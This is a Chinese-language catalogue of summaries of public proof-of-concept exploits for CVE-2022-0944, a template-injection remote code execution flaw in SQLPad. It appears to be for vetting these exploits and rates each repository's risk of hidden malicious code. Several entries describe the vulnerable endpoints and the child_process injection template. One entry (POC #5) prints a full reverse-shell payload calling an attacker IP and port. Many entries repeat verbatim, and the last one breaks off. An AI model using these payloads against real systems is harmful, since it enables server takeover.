**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---



---

## POC #3

**来源**: [CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md](../2022/CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行 (RCE)

**影响应用:** SQLPad

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户账户

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944 是 SQLPad 中一个严重的漏洞，攻击者可以通过连接测试端点的模板注入来执行远程代码。根据漏洞库信息和搜索引擎结果，这是一个已知的漏洞，并且存在公开的漏洞利用代码。

**有效性：**

提供的漏洞利用代码（`main.py`）针对此漏洞，并包含使用示例。该代码利用模板注入漏洞，允许攻击者在 SQLPad 服务器上执行任意代码。 根据github上的信息，经验证漏洞可以利用成功。

**投毒风险：**

审查提供的文件，`README.md` 和 `SECURITY.md` 文件看起来标准且无恶意内容。`main.py` 是漏洞利用的核心，需要仔细分析。虽然代码本身的功能是利用漏洞，但仍然存在隐藏恶意代码的可能性，如：

*   **数据回传：** 漏洞利用脚本可能在未经授权的情况下将目标服务器的信息发送给攻击者。
*   **后门植入：** 脚本可能在目标系统上安装后门，以便后续访问。
*   **资源消耗：** 脚本可能消耗目标系统资源，导致拒绝服务。
    
尽管存在这些风险，但脚本的主要目的是利用已知的漏洞。由于脚本代码相对较短且直接，隐藏复杂恶意代码的可能性较低。 综合评估，投毒风险约为 10%，主要基于可能存在的隐蔽数据回传或简单的后门植入。

**利用方式：**

1.  **前提条件：**
    *   目标系统运行的是 SQLPad 6.10.1 之前的版本。
    *   攻击者需要拥有 SQLPad 的高权限用户账户（根据CVE描述，PrivilegesRequired为HIGH）。
2.  **漏洞触发：**
    *   攻击者使用 `main.py` 脚本，提供目标 SQLPad 的 URL、监听 IP 地址和端口，以及高权限用户名和密码。
    *   脚本利用模板注入漏洞，在连接测试端点注入恶意代码。
3.  **远程代码执行：**
    *   注入的恶意代码在 SQLPad 服务器上执行，通常会建立一个反向 shell 连接到攻击者的监听器。
4.  **控制系统：**
    *   攻击者通过反向 shell 获取对 SQLPad 服务器的控制权，可以执行任意命令，访问敏感数据，甚至完全控制系统。

**项目地址:** [Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944](https://github.com/Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #4

**来源**: [CVE-2022-0944-FlojBoj_CVE-2022-0944.md](../2022/CVE-2022-0944-FlojBoj_CVE-2022-0944.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 6.10.0

**利用条件:** 需要高权限用户凭证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于SQLPad的connection test接口，由于使用了模板引擎且未对用户输入进行充分的过滤，导致攻击者可以通过构造恶意模板代码，在服务器端执行任意命令。根据提供的POC代码，利用方式如下：

1.  **身份验证：** 如果需要，首先使用提供的用户名和密码登录SQLPad应用，获取Cookie。
2.  **构造恶意JSON数据：**  构造包含恶意模板代码的JSON数据，其中`database`字段包含利用`process.mainModule.require('child_process').exec()`执行命令的payload。Payload形如：`{{ process.mainModule.require('child_process').exec('命令') }}`
3.  **发送POST请求：** 将构造的JSON数据通过POST请求发送到`/api/test-connection`接口。如果需要，在请求头中包含Cookie。
4.  **执行命令：**  服务器端收到请求后，模板引擎解析`database`字段中的恶意代码，从而执行攻击者指定的命令。
5. **有效性:** 根据漏洞信息和POC，此漏洞的POC代码有效，可以实现远程代码执行。
6.  **投毒风险分析：**  查看了`exploit.py`脚本，该脚本的功能是发送带有恶意payload的请求到目标SQLPad实例的`/api/test-connection`接口，从而触发RCE。没有发现任何其他隐藏的恶意代码，例如上传后门、修改文件等。因此，可以认为该POC代码不存在投毒风险，投毒风险概率为0%。

**项目地址:** [FlojBoj/CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #5

**来源**: [CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #6

**来源**: [CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md](../2022/CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md)

## CVE-2022-0944-sqlpad-TemplateInjection-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** sqlpad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要目标sqlpad实例的网络访问，以及具有创建连接权限的高权限用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944是sqlpad中存在的一个模板注入漏洞，存在于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而完全控制服务器。 

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要拥有 sqlpad 实例中具有创建连接权限的用户身份，一般是管理员权限。
2.  **构造Payload：** 攻击者构造包含恶意代码的模板注入Payload。该Payload利用了Node.js的`child_process.exec`函数来执行系统命令。从提供的漏洞利用代码中可以看到，payload的形式为`{{ process.mainModule.require('child_process').exec('COMMAND') }}`，其中COMMAND是要执行的命令。
3.  **发送请求：**  攻击者通过POST请求将包含Payload的JSON数据发送到`/api/connections`端点，创建一个新的数据库连接配置。关键在于`data.database`字段，该字段会被模板引擎解析，导致代码执行。
4.  **触发漏洞：**  创建连接后，攻击者通过GET请求访问`/api/connections/{id}/schema`端点，触发连接测试，从而执行Payload。
5.  **反弹shell (可选)：**  为了方便利用，攻击者通常使用Payload执行反弹shell命令，从而获得对目标服务器的控制权。
6.  **利用代码分析:**
    * `exploit.py`是一个Python脚本，实现了CVE-2022-0944漏洞的自动化利用。
    * 脚本接受目标URL、攻击者IP等参数。
    * 脚本首先创建一个随机字符串，作为连接名称。
    * 脚本构造包含恶意代码的JSON数据，并将其发送到`/api/connections`端点。
    * 脚本通过GET请求访问`/api/connections/{id}/schema`端点，触发漏洞，从而执行Payload。
    * 脚本可以监听指定端口，接收命令执行结果（通过base64编码）。

**投毒风险评估：**

该代码主要实现了漏洞利用功能，但仍存在一定的投毒风险，评估为10%。理由如下：

*   **潜在的恶意命令注入：** 攻击者可以通过`-c`参数指定要执行的命令。如果脚本没有对该参数进行充分的验证和过滤，攻击者可能会注入恶意命令，例如下载和执行额外的恶意程序。
*   **后门植入：** 攻击者可能修改脚本，在成功利用漏洞后，在目标服务器上植入后门，以便长期控制目标系统。
*   **信息收集：** 脚本可以收集目标服务器的信息，例如操作系统版本、已安装的软件等。这些信息可能会被泄露给攻击者，用于进一步的攻击。

因此，在使用该脚本时，需要仔细检查代码，确保没有恶意代码被注入，并采取必要的安全措施，例如限制脚本的执行权限、监控脚本的网络活动等。

**项目地址:** [Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #7

**来源**: [CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md](../2022/CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** SQLPad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-0944是SQLPad版本低于6.10.1中存在的一个模板注入漏洞。该漏洞位于connection test endpoint。攻击者可以利用该漏洞在服务器上执行任意代码。根据漏洞描述和提供的POC代码，利用方式如下：

1.  **漏洞原理：** SQLPad在测试数据库连接时，没有充分过滤用户提供的数据库配置信息，导致攻击者可以在数据库配置（例如数据库名称）中使用模板引擎的语法。
2.  **攻击步骤：**
    *   攻击者需要具有高权限才能访问connection test endpoint。
    *   攻击者构造包含恶意代码的payload。该payload利用`process.mainModule.require('child_process').exec()`来执行系统命令。POC中使用反向shell作为例子。
    *   攻击者将构造好的payload插入到数据库连接配置的`database`字段中，并发送到`/api/test-connection`接口。
    *   服务器在测试连接时，会解析payload中的模板代码，从而执行攻击者指定的系统命令，实现远程代码执行。
3.  **POC有效性：** 提供的POC代码利用python脚本自动化了上述攻击过程，通过发送精心构造的POST请求，可以触发漏洞并获得反向shell。根据代码逻辑和漏洞描述，该POC代码是有效的。
4.  **投毒风险：** 代码的`README.md`中声明仅用于教育目的，并免责。代码本身主要功能是发送包含恶意payload的HTTP请求，并在本地监听端口接收反向shell。虽然代码主要功能是漏洞利用，但仍然存在一些潜在的投毒风险：
    *   **Netcat依赖：** POC依赖于系统安装`netcat`，如果目标系统没有`netcat`，漏洞利用会失败。但是，如果攻击者修改了脚本，将反向shell的方式修改为使用python或其他目标系统更可能存在的工具，可能会增加攻击成功率。
    *   **隐蔽后门：** 理论上，脚本可以被修改为在受害者机器上安装持久性后门，例如添加计划任务或者修改启动脚本，但当前的脚本未发现此类行为。
    *   **依赖风险：** 脚本依赖于`requests`库。如果攻击者修改了`requirements.txt`文件，添加恶意的依赖包，可能导致用户安装恶意库。
    *   **安全声明免责：**虽然声明了免责条款，但是仍要小心使用，务必在授权的渗透测试场景中使用。
    *   综合评估，由于POC的主要功能是RCE利用，且代码相对简单，隐藏恶意代码的难度较高。因此投毒风险较低，估计在5%左右。

**项目地址:** [Robocopsita/CVE-2022-0944_RCE_POC](https://github.com/Robocopsita/CVE-2022-0944_RCE_POC)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #8

**来源**: [CVE-2022-0944-shhrew_CVE-2022-0944.md](../2022/CVE-2022-0944-shhrew_CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad 模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户访问，目标存在 /api/test-connection 接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 漏洞是 SQLPad 6.10.1 之前版本中存在的一个模板注入漏洞。该漏洞位于 `/api/test-connection` 接口，攻击者可以通过构造恶意的模板注入payload，执行任意代码。根据漏洞库信息，该漏洞的CVSS 3.0评分为9.1，属于严重级别。搜索引擎结果显示，已经存在公开的漏洞利用代码。

**有效性：**

根据提供的漏洞利用代码，该PoC使用 Python 编写，通过向 `/api/test-connection` 发送包含恶意payload的请求来触发漏洞。Payload 使用 `process.mainModule.require('child_process').exec()` 执行系统命令。代码中还包含一个反弹shell的功能，方便攻击者进行利用。该POC代码看起来是有效的，因为漏洞信息和代码逻辑是符合的.

**投毒风险：**

查看了提供的PoC代码，包含`LICENSE`，`README.md` 和 `main.py` 文件，没有发现明显的恶意代码或者后门，只是实现了漏洞的利用。代码功能比较直观，主要是发送恶意请求并监听端口获取反弹shell。因此，投毒风险评估为0%。

**利用方式：**

1.  **身份验证（可选）：** 如果目标SQLPad实例启用了身份验证，攻击者需要提供有效的用户名和密码才能利用该漏洞。PoC代码提供了身份验证功能。
2.  **发送恶意请求：** 攻击者构造一个包含恶意payload的JSON数据，并将其发送到 `/api/test-connection` 接口。Payload中利用了模板注入的特性，执行任意系统命令，启动反弹shell.
3.  **监听反弹Shell：** 攻击者在本地设置一个监听器，等待目标服务器连接，从而获得对目标服务器的控制权。

总而言之，该漏洞的利用方式简单直接，只需要发送一个精心构造的请求即可实现远程代码执行，风险极高。在sqlpad 6.10.1之前的版本应该升级。

**项目地址:** [shhrew/CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #9

**来源**: [CVE-2022-0944-toneillcodes_CVE-2022-0944.md](../2022/CVE-2022-0944-toneillcodes_CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 6.10.1

**利用条件:** 需要目标实例存在/api/test-connection接口, 需要较高权限才能访问该接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是SQLPad 6.10.1之前版本中存在的一个模板注入漏洞。攻击者可以通过向`/api/test-connection`端点发送特制的请求，在服务器上执行任意代码，从而完全控制服务器。根据漏洞库信息和搜索结果，该漏洞危害巨大，易于利用。漏洞利用代码中的Python脚本通过构造包含恶意payload的JSON数据，并将其发送到目标服务器的`/api/test-connection`端点，从而触发远程代码执行。Payload使用 `child_process.exec` 函数来执行操作系统命令，并建立反向shell连接到攻击者的机器。 检查漏洞利用代码，没有发现明显的投毒迹象。Payload部分是标准的反向shell，没有其他恶意行为。因此，投毒风险较低。

**利用方式：**
1.  攻击者需要访问SQLPad实例的`/api/test-connection`接口。
2.  攻击者构造一个包含恶意模板注入payload的JSON请求。Payload使用JavaScript代码调用`child_process.exec`函数来执行任意命令。
3.  攻击者将构造的JSON请求发送到`/api/test-connection`端点。
4.  SQLPad服务器处理该请求时，模板引擎会解析恶意payload，导致执行攻击者指定的命令。
5.  攻击者可以在服务器上执行任意代码，例如创建反向shell连接，从而完全控制服务器。

**项目地址:** [toneillcodes/CVE-2022-0944](https://github.com/toneillcodes/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---



---

## POC #3

**来源**: [CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md](../2022/CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行 (RCE)

**影响应用:** SQLPad

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户账户

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944 是 SQLPad 中一个严重的漏洞，攻击者可以通过连接测试端点的模板注入来执行远程代码。根据漏洞库信息和搜索引擎结果，这是一个已知的漏洞，并且存在公开的漏洞利用代码。

**有效性：**

提供的漏洞利用代码（`main.py`）针对此漏洞，并包含使用示例。该代码利用模板注入漏洞，允许攻击者在 SQLPad 服务器上执行任意代码。 根据github上的信息，经验证漏洞可以利用成功。

**投毒风险：**

审查提供的文件，`README.md` 和 `SECURITY.md` 文件看起来标准且无恶意内容。`main.py` 是漏洞利用的核心，需要仔细分析。虽然代码本身的功能是利用漏洞，但仍然存在隐藏恶意代码的可能性，如：

*   **数据回传：** 漏洞利用脚本可能在未经授权的情况下将目标服务器的信息发送给攻击者。
*   **后门植入：** 脚本可能在目标系统上安装后门，以便后续访问。
*   **资源消耗：** 脚本可能消耗目标系统资源，导致拒绝服务。
    
尽管存在这些风险，但脚本的主要目的是利用已知的漏洞。由于脚本代码相对较短且直接，隐藏复杂恶意代码的可能性较低。 综合评估，投毒风险约为 10%，主要基于可能存在的隐蔽数据回传或简单的后门植入。

**利用方式：**

1.  **前提条件：**
    *   目标系统运行的是 SQLPad 6.10.1 之前的版本。
    *   攻击者需要拥有 SQLPad 的高权限用户账户（根据CVE描述，PrivilegesRequired为HIGH）。
2.  **漏洞触发：**
    *   攻击者使用 `main.py` 脚本，提供目标 SQLPad 的 URL、监听 IP 地址和端口，以及高权限用户名和密码。
    *   脚本利用模板注入漏洞，在连接测试端点注入恶意代码。
3.  **远程代码执行：**
    *   注入的恶意代码在 SQLPad 服务器上执行，通常会建立一个反向 shell 连接到攻击者的监听器。
4.  **控制系统：**
    *   攻击者通过反向 shell 获取对 SQLPad 服务器的控制权，可以执行任意命令，访问敏感数据，甚至完全控制系统。

**项目地址:** [Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944](https://github.com/Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #4

**来源**: [CVE-2022-0944-FlojBoj_CVE-2022-0944.md](../2022/CVE-2022-0944-FlojBoj_CVE-2022-0944.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 6.10.0

**利用条件:** 需要高权限用户凭证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于SQLPad的connection test接口，由于使用了模板引擎且未对用户输入进行充分的过滤，导致攻击者可以通过构造恶意模板代码，在服务器端执行任意命令。根据提供的POC代码，利用方式如下：

1.  **身份验证：** 如果需要，首先使用提供的用户名和密码登录SQLPad应用，获取Cookie。
2.  **构造恶意JSON数据：**  构造包含恶意模板代码的JSON数据，其中`database`字段包含利用`process.mainModule.require('child_process').exec()`执行命令的payload。Payload形如：`{{ process.mainModule.require('child_process').exec('命令') }}`
3.  **发送POST请求：** 将构造的JSON数据通过POST请求发送到`/api/test-connection`接口。如果需要，在请求头中包含Cookie。
4.  **执行命令：**  服务器端收到请求后，模板引擎解析`database`字段中的恶意代码，从而执行攻击者指定的命令。
5. **有效性:** 根据漏洞信息和POC，此漏洞的POC代码有效，可以实现远程代码执行。
6.  **投毒风险分析：**  查看了`exploit.py`脚本，该脚本的功能是发送带有恶意payload的请求到目标SQLPad实例的`/api/test-connection`接口，从而触发RCE。没有发现任何其他隐藏的恶意代码，例如上传后门、修改文件等。因此，可以认为该POC代码不存在投毒风险，投毒风险概率为0%。

**项目地址:** [FlojBoj/CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #5

**来源**: [CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #6

**来源**: [CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md](../2022/CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md)

## CVE-2022-0944-sqlpad-TemplateInjection-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** sqlpad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要目标sqlpad实例的网络访问，以及具有创建连接权限的高权限用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944是sqlpad中存在的一个模板注入漏洞，存在于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而完全控制服务器。 

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要拥有 sqlpad 实例中具有创建连接权限的用户身份，一般是管理员权限。
2.  **构造Payload：** 攻击者构造包含恶意代码的模板注入Payload。该Payload利用了Node.js的`child_process.exec`函数来执行系统命令。从提供的漏洞利用代码中可以看到，payload的形式为`{{ process.mainModule.require('child_process').exec('COMMAND') }}`，其中COMMAND是要执行的命令。
3.  **发送请求：**  攻击者通过POST请求将包含Payload的JSON数据发送到`/api/connections`端点，创建一个新的数据库连接配置。关键在于`data.database`字段，该字段会被模板引擎解析，导致代码执行。
4.  **触发漏洞：**  创建连接后，攻击者通过GET请求访问`/api/connections/{id}/schema`端点，触发连接测试，从而执行Payload。
5.  **反弹shell (可选)：**  为了方便利用，攻击者通常使用Payload执行反弹shell命令，从而获得对目标服务器的控制权。
6.  **利用代码分析:**
    * `exploit.py`是一个Python脚本，实现了CVE-2022-0944漏洞的自动化利用。
    * 脚本接受目标URL、攻击者IP等参数。
    * 脚本首先创建一个随机字符串，作为连接名称。
    * 脚本构造包含恶意代码的JSON数据，并将其发送到`/api/connections`端点。
    * 脚本通过GET请求访问`/api/connections/{id}/schema`端点，触发漏洞，从而执行Payload。
    * 脚本可以监听指定端口，接收命令执行结果（通过base64编码）。

**投毒风险评估：**

该代码主要实现了漏洞利用功能，但仍存在一定的投毒风险，评估为10%。理由如下：

*   **潜在的恶意命令注入：** 攻击者可以通过`-c`参数指定要执行的命令。如果脚本没有对该参数进行充分的验证和过滤，攻击者可能会注入恶意命令，例如下载和执行额外的恶意程序。
*   **后门植入：** 攻击者可能修改脚本，在成功利用漏洞后，在目标服务器上植入后门，以便长期控制目标系统。
*   **信息收集：** 脚本可以收集目标服务器的信息，例如操作系统版本、已安装的软件等。这些信息可能会被泄露给攻击者，用于进一步的攻击。

因此，在使用该脚本时，需要仔细检查代码，确保没有恶意代码被注入，并采取必要的安全措施，例如限制脚本的执行权限、监控脚本的网络活动等。

**项目地址:** [Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #7

**来源**: [CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md](../2022/CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** SQLPad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-0944是SQLPad版本低于6.10.1中存在的一个模板注入漏洞。该漏洞位于connection test endpoint。攻击者可以利用该漏洞在服务器上执行任意代码。根据漏洞描述和提供的POC代码，利用方式如下：

1.  **漏洞原理：** SQLPad在测试数据库连接时，没有充分过滤用户提供的数据库配置信息，导致攻击者可以在数据库配置（例如数据库名称）中使用模板引擎的语法。
2.  **攻击步骤：**
    *   攻击者需要具有高权限才能访问connection test endpoint。
    *   攻击者构造包含恶意代码的payload。该payload利用`process.mainModule.require('child_process').exec()`来执行系统命令。POC中使用反向shell作为例子。
    *   攻击者将构造好的payload插入到数据库连接配置的`database`字段中，并发送到`/api/test-connection`接口。
    *   服务器在测试连接时，会解析payload中的模板代码，从而执行攻击者指定的系统命令，实现远程代码执行。
3.  **POC有效性：** 提供的POC代码利用python脚本自动化了上述攻击过程，通过发送精心构造的POST请求，可以触发漏洞并获得反向shell。根据代码逻辑和漏洞描述，该POC代码是有效的。
4.  **投毒风险：** 代码的`README.md`中声明仅用于教育目的，并免责。代码本身主要功能是发送包含恶意payload的HTTP请求，并在本地监听端口接收反向shell。虽然代码主要功能是漏洞利用，但仍然存在一些潜在的投毒风险：
    *   **Netcat依赖：** POC依赖于系统安装`netcat`，如果目标系统没有`netcat`，漏洞利用会失败。但是，如果攻击者修改了脚本，将反向shell的方式修改为使用python或其他目标系统更可能存在的工具，可能会增加攻击成功率。
    *   **隐蔽后门：** 理论上，脚本可以被修改为在受害者机器上安装持久性后门，例如添加计划任务或者修改启动脚本，但当前的脚本未发现此类行为。
    *   **依赖风险：** 脚本依赖于`requests`库。如果攻击者修改了`requirements.txt`文件，添加恶意的依赖包，可能导致用户安装恶意库。
    *   **安全声明免责：**虽然声明了免责条款，但是仍要小心使用，务必在授权的渗透测试场景中使用。
    *   综合评估，由于POC的主要功能是RCE利用，且代码相对简单，隐藏恶意代码的难度较高。因此投毒风险较低，估计在5%左右。

**项目地址:** [Robocopsita/CVE-2022-0944_RCE_POC](https://github.com/Robocopsita/CVE-2022-0944_RCE_POC)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #8

**来源**: [CVE-2022-0944-shhrew_CVE-2022-0944.md](../2022/CVE-2022-0944-shhrew_CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad 模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户访问，目标存在 /api/test-connection 接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 漏洞是 SQLPad 6.10.1 之前版本中存在的一个模板注入漏洞。该漏洞位于 `/api/test-connection` 接口，攻击者可以通过构造恶意的模板注入payload，执行任意代码。根据漏洞库信息，该漏洞的CVSS 3.0评分为9.1，属于严重级别。搜索引擎结果显示，已经存在公开的漏洞利用代码。
